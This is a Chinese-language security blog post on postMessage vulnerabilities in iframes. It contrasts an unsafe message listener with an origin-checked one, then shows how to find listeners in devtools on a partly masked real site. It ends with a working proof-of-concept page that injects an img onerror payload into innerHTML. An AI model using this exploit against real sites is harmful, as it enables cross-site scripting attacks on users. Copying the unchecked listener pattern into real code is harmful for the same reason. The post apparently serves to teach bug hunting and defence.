---
title: 挖掘iframe通信安全漏洞
date: 2022-06-12T14:45:47+08:00
lastmod: 2022-06-12T14:45:47+08:00
categories: ["安全"]
---



## 挖掘iframe通信安全漏洞

### 原理

跨域通信一般是直接ajax,用限定请求域名的方法来保证安全.但是也具有其中的局限性,只能读取服务器数据.而不能读取本地的localStorage数据等.

如果需要本地数据,依然需要iframe,现在iframe通信采用的是`postmessage`的形式

一个简单的例子就是

```
 window.addEventListener("message", (function(e) {
                console.log("[evt]", e.data),
                
 }
 
 window.parent.postMessage({
                            scrollHeight: t,
                            pageHight: t,
                            orange: e.warnSensitive,
                            red: e.dangerSensitive
 }, "*")
 
```

以上实际上是很不安全的例子,因为`postmessage`没有浏览器的跨域保护, 接收的数据可能来源于任何一个域名.

正确的写法应该是

```
 window.addEventListener("message", (function(e) {
   if (e.origin !== "http://example.com")
    return;
    }
   console.log("[evt]", e.data),
                e.data.cvid && (e.data.text || e.data.newHtml) &&      t.setContent(e.data)
 }
```



### 实战

![image-20220612144739249](/images/image-20220612144739249.png)

在浏览器f12就能直接看到iframe的载入. 当然iframe也可能是单纯用于展示,没有`postmessage`的通信.

不过可以在浏览器点击`global listeners` 然后看有没有`message`的事件监听者

![image-20220612150032455](/images/image-20220612150032455.png)

可以看到其中有两个,其中有一个是框架生成的,另一个才是程序员自己写的.框架那个做了验证,

蓝色的链接也能直接点到达代码位置



代码大致如下

```

 window.addEventListener("message", (function(e) {
                var t = this;
                console.log("[evt]", e.data),
                e.data.cvid && (e.data.text || e.data.newHtml) && t.setContent(e.data)
  }
  
  setContent: function(t) {
                if (t.newHtml) {
                    var n = function() {
                        var t = arguments.length &gt; 0 && void 0 !== arguments[0] ? arguments[0] : ""
                          , e = arguments.length &gt; 1 && void 0 !== arguments[1] ? arguments[1] : []
                          , n = arguments.length &gt; 2 && void 0 !== arguments[2] ? arguments[2] : []
                          , i = h(t, e)
                          , o = h(i.content, n)
                          , a = document.createElement("div")
                        a.innerHTML = o.content,
// 省略

```

直接传入了`innerhtml` ,从代码的取值可以构造出以下exp

```
<iframe width="800" height="800" id="bilibili" style="display:none"></iframe>
<script>
const iframe = document.getElementById("bilibili")
iframe.setAttribute("src", "https://www.***.com/h5/note-app/review");
iframe.addEventListener("load", () => {
iframe.contentWindow.postMessage(
                    {
                        newHtml:"<img onerror='console.log(1)' src='x' >",
                        cvid:1,
                    },"*"
);
})
</script>
```



### 总结

原理和挖掘是不难的, 主要依赖于程序员忘记对iframe验证的错觉. 危害评估最高也就csrf和xss的级别,依赖于被攻击者进入你的网站.
